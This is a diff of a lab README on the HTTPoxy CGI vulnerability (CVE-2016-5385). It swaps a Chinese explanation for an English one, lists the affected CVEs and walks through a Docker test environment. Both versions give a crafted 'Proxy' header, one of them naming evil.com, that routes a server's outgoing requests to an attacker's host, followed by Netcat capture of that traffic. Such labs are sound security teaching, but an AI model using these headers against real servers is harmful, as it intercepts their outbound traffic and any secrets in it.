@@ -1,35 +1,53 @@
-# HTTPoxy漏洞（CVE-2016-5385）
+# HTTPoxy CGI application vulnerability (CVE-2016-5385)
 
-## 原理
+[中文版本(Chinese version)](README.zh-cn.md)
 
-参考：http://www.laruence.com/2016/07/19/3101.html
+httpoxy is a set of vulnerabilities that affect application code running in CGI, or CGI-like environments. It comes down to a simple namespace conflict:
 
-简单来说，根据RFC 3875规定，cgi（fastcgi）要将用户传入的所有HTTP头都加上`HTTP_`前缀放入环境变量中，而恰好大多数类库约定俗成会提取环境变量中的`HTTP_PROXY`值作为HTTP代理地址。于是，恶意用户通过提交`Proxy: http://evil.com`这样的HTTP头，将使用缺陷类库的网站的代理设置为`http://evil.com`，进而窃取数据包中可能存在的敏感信息。
+- RFC 3875 (CGI) puts the HTTP Proxy header from a request into the environment variables as `HTTP_PROXY`
+- `HTTP_PROXY` is a popular environment variable used to configure an outgoing proxy
 
-PHP5.6.24版本修复了该漏洞，不会再将`Proxy`放入环境变量中。本环境使用PHP 5.6.23为例。
+This leads to a remotely exploitable vulnerability. See <https://httpoxy.org> for further principles description.
 
-当然，该漏洞不止影响PHP，所有以CGI或Fastcgi运行的程序理论上都受到影响。
+CVE-2016-5385 is one of CVEs that assign for HTTPoxy, here are the full CVEs list:
 
-## 测试流程
+- CVE-2016-5385: PHP
+- CVE-2016-5386: Go
+- CVE-2016-5387: Apache HTTP Server
+- CVE-2016-5388: Apache Tomcat
+- CVE-2016-6286: spiffy-cgi-handlers for CHICKEN
+- CVE-2016-6287: CHICKEN’s http-client
+- CVE-2016-1000104: mod_fcgi
+- CVE-2016-1000105: Nginx cgi script
+- CVE-2016-1000107: Erlang inets
+- CVE-2016-1000108: YAWS
+- CVE-2016-1000109: HHVM FastCGI
+- CVE-2016-1000110: Python CGIHandler
+- CVE-2016-1000111: Python Twisted
+- CVE-2016-1000212: lighttpd
 
-编译、运行本环境：
+## Vulnerable environment:
+
+Execute following command to start a Web application depending on PHP 5.6.23 and GuzzleHttp 6.2.0.
 
 ```
 docker-compose up -d
 ```
 
-正常请求`http://your-ip:8080/index.php`，可见其Origin为当前请求的服务器，二者IP相等：
+This [Web page](www/index.php) get its origin IP address at `http://httpbin.org/get`:
 
 ![](1.png)
 
-在其他地方找到一个可以正常运行的http代理，如`http://x.x.122.65:8888/`。
+At this moment, hostname IP is equal to original IP, no HTTP proxy.
 
-附带`Proxy: http://x.x.122.65:8888/`头，再次访问`http://your-ip:8080/index.php`：
+## Exploit
+
+Send a request with a craft HTTP header that contains a available HTTP proxy address: `Proxy: http://*.*.122.65:8888/`:
 
 ![](2.png)
 
-如上图，可见此时的Origin已经变成`x.x.122.65`，也就是说真正进行HTTP访问的服务器是`x.x.122.65`，也就是说`x.x.122.65`已经将正常的HTTP请求代理了。
+It is obvious that the original address in the response has become the IP address of the proxy server.
 
-在`x.x.122.65`上使用NC，就可以捕获当前请求的数据包，其中可能包含敏感数据：
+Start a Netcat server at the `*.*.122.65` instead of HTTP proxy, we can capture the original request:
 
 ![](3.png)
